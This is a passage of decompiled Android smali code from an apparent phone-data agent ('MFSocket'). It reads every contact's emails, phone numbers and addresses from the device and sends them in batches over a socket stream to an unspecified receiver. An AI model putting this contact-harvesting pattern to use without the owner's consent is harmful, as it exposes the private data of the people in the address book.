    iget-object v2, v8, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 271
    iget-object v2, v8, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 272
    invoke-static/range {p2 .. p2}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 274
    rem-int v2, v16, p3

    if-nez v2, :cond_5

    .line 275
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 276
    const/4 v2, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 278
    :cond_5
    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_2

    .line 279
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 280
    const/4 v2, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 281
    invoke-interface {v12}, Landroid/database/Cursor;->close()V

    goto/16 :goto_0

    .line 242
    .end local v8    # "addrHolder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    .end local v14    # "emailHolder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    .end local v19    # "phoneHolder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    :cond_6
    new-instance v19, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;

    invoke-direct/range {v19 .. v20}, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .restart local v19    # "phoneHolder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    goto/16 :goto_1
.end method

.method getEmailMap()V
    .locals 14

    .prologue
    const/4 v13, 0x0

    const/4 v3, 0x0

    const/4 v12, 0x2

    const/4 v11, 0x1

    .line 47
    const/4 v0, 0x3

    new-array v2, v0, [Ljava/lang/String;

    const-string v0, "contact_id"

    aput-object v0, v2, v13

    const-string v0, "data2"

    aput-object v0, v2, v11

    const-string v0, "data1"

    aput-object v0, v2, v12

    .line 48
    .local v2, "projection":[Ljava/lang/String;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Email;->CONTENT_URI:Landroid/net/Uri;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 49
    .local v8, "emails":Landroid/database/Cursor;
    if-nez v8, :cond_0

    .line 81
    :goto_0
    return-void

    .line 52
    :cond_0
    invoke-interface {v8}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_4

    .line 54
    :cond_1
    invoke-interface {v8, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 55
    .local v10, "id":Ljava/lang/String;
    invoke-interface {v8, v11}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    .line 56
    .local v6, "emailType":I
    invoke-interface {v8, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 57
    .local v7, "emailValue":Ljava/lang/String;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mMailMap:Ljava/util/HashMap;

    invoke-virtual {v0, v10}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;

    .line 58
    .local v9, "holder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    if-nez v9, :cond_2

    .line 59
    new-instance v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;

    .end local v9    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    invoke-direct {v9, p0}, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .line 60
    .restart local v9    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mMailMap:Ljava/util/HashMap;

    invoke-virtual {v0, v10, v9}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 63
    :cond_2
    if-ne v11, v6, :cond_6

    .line 64
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    if-nez v0, :cond_5

    .line 65
    iput-object v7, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    .line 78
    :cond_3
    :goto_1
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 80
    .end local v6    # "emailType":I
    .end local v7    # "emailValue":Ljava/lang/String;
    .end local v9    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    .end local v10    # "id":Ljava/lang/String;
    :cond_4
    invoke-interface {v8}, Landroid/database/Cursor;->close()V

    goto :goto_0

    .line 67
    .restart local v6    # "emailType":I
    .restart local v7    # "emailValue":Ljava/lang/String;
    .restart local v9    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    .restart local v10    # "id":Ljava/lang/String;
    :cond_5
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, ";"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    .line 68
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    goto :goto_1

    .line 70
    :cond_6
    if-ne v12, v6, :cond_3

    .line 71
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    if-nez v0, :cond_7

    .line 72
    iput-object v7, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    goto :goto_1

    .line 74
    :cond_7
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, ";"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    .line 75
    iget-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v9, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    goto :goto_1
.end method

.method getPhoneMap()V
    .locals 14

    .prologue
    const/4 v13, 0x2

    const/4 v12, 0x1

    const/4 v11, 0x0

    const/4 v3, 0x0

    .line 97
    const/4 v0, 0x3

    new-array v2, v0, [Ljava/lang/String;

    const-string v0, "contact_id"

    aput-object v0, v2, v11

    const-string v0, "data2"

    aput-object v0, v2, v12

    const-string v0, "data1"

    aput-object v0, v2, v13

    .line 98
    .local v2, "projection":[Ljava/lang/String;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 99
    .local v10, "phones":Landroid/database/Cursor;
    if-nez v10, :cond_0

    .line 143
    :goto_0
    return-void

    .line 102
    :cond_0
    invoke-interface {v10}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 104
    :cond_1
    invoke-interface {v10, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 105
    .local v7, "id":Ljava/lang/String;
    invoke-interface {v10, v12}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    .line 106
    .local v9, "phoneType":I
    invoke-interface {v10, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 107
    .local v8, "phoneNumber":Ljava/lang/String;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mPhoneMap:Ljava/util/HashMap;

    invoke-virtual {v0, v7}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;

    .line 108
    .local v6, "holder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    if-nez v6, :cond_2

    .line 109
    new-instance v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;

    .end local v6    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    invoke-direct {v6, p0}, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .line 110
    .restart local v6    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mPhoneMap:Ljava/util/HashMap;

    invoke-virtual {v0, v7, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 112
    :cond_2
    packed-switch v9, :pswitch_data_0

    .line 140
    :goto_1
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 142
    .end local v6    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    .end local v7    # "id":Ljava/lang/String;
    .end local v8    # "phoneNumber":Ljava/lang/String;
    .end local v9    # "phoneType":I
    :cond_3
    invoke-interface {v10}, Landroid/database/Cursor;->close()V

    goto :goto_0

    .line 114
    .restart local v6    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    .restart local v7    # "id":Ljava/lang/String;
    .restart local v8    # "phoneNumber":Ljava/lang/String;
    .restart local v9    # "phoneType":I
    :pswitch_0
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->mobile:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->mobile:Ljava/lang/String;

    goto :goto_1

    .line 117
    :pswitch_1
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->workNo:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->workNo:Ljava/lang/String;

    goto :goto_1

    .line 120
    :pswitch_2
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->homeNo:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->homeNo:Ljava/lang/String;

    goto :goto_1

    .line 123
    :pswitch_3
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->pagerNo:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->pagerNo:Ljava/lang/String;

    goto :goto_1

    .line 126
    :pswitch_4
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->customNo:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->customNo:Ljava/lang/String;

    goto :goto_1

    .line 129
    :pswitch_5
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->otherNo:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->otherNo:Ljava/lang/String;

    goto :goto_1

    .line 132
    :pswitch_6
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxHome:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxHome:Ljava/lang/String;

    goto :goto_1

    .line 135
    :pswitch_7
    iget-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxWork:Ljava/lang/String;

    invoke-virtual {p0, v0, v8}, Lcom/Android/MFSocket/ContactsMsgOS20;->appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxWork:Ljava/lang/String;

    goto :goto_1

    .line 112
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_4
        :pswitch_2
        :pswitch_0
        :pswitch_1
        :pswitch_7
        :pswitch_6
        :pswitch_3
        :pswitch_5
    .end packed-switch
.end method
